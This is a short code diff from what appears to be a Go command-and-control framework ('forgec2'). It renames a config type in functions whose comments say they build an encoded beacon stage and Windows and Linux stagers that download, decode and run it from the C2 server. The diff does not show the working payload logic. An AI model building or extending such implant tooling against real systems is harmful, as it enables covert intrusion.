@@ -13,7 +13,7 @@ import (
 
 // GenerateStage builds a full beacon EXE then XOR-encodes + base64-encodes it.
 // Returns the path to the encoded stage file and the hex-encoded XOR key.
-func GenerateStage(cfg AgentConfig, outputDir string) (stagePath string, xorKeyHex string, err error) {
+func GenerateStage(cfg ImplantConfig, outputDir string) (stagePath string, xorKeyHex string, err error) {
 	// Generate the full beacon EXE first
 	exePath, err := GenerateWindowsEXE(cfg, outputDir)
 	if err != nil {
@@ -54,7 +54,7 @@ func GenerateStage(cfg AgentConfig, outputDir string) (stagePath string, xorKeyH
 
 // GenerateStager builds a minimal Windows stager EXE that downloads, decodes,
 // and executes the stage from the C2 server.
-func GenerateStager(cfg AgentConfig, outputDir, xorKeyHex string) (string, error) {
+func GenerateStager(cfg ImplantConfig, outputDir, xorKeyHex string) (string, error) {
 	tmpDir, err := os.MkdirTemp("", "forgec2-stager-*")
 	if err != nil {
 		return "", err
@@ -205,7 +205,7 @@ go 1.25
 }
 
 // GenerateStagerLinux builds a minimal Linux ELF stager.
-func GenerateStagerLinux(cfg AgentConfig, outputDir, xorKeyHex string) (string, error) {
+func GenerateStagerLinux(cfg ImplantConfig, outputDir, xorKeyHex string) (string, error) {
 	tmpDir, err := os.MkdirTemp("", "forgec2-stager-linux-*")
 	if err != nil {
 		return "", err
